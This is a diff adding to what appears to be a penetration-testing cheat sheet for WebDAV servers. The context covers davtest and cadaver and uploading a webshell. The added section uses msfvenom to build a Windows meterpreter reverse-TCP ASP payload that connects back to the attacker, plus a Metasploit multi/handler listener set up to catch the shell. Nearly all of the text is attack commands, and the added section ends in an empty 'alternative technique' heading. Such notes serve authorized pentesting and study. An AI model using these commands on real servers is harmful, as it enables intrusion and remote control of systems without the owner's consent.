@@ -36,7 +36,7 @@ davtest -auth username:password -url http://victim.com
 
 **Cadaver**
 
-cadaver http://ip.addr
+cadaver http://ip.addr/webdav
 
 * enter credentials *
 
@@ -47,5 +47,27 @@ Kali keeps webshells under /usr/share/webshells
 put /path/to/webshell
 
 This provides you with a webshell that you can interact with through the web browser.
+
+**Metasploit**
+
+can use msfvenom to generate the payload
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=local.addr LPORT=1337 -f asp > shell.asp
+
+(32 bit shells are normally recommended)
+
+Configure your listener in Metasploit
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set your options to match your msfvenom
+
+* alternative technique *
+
+
+
+
 
 
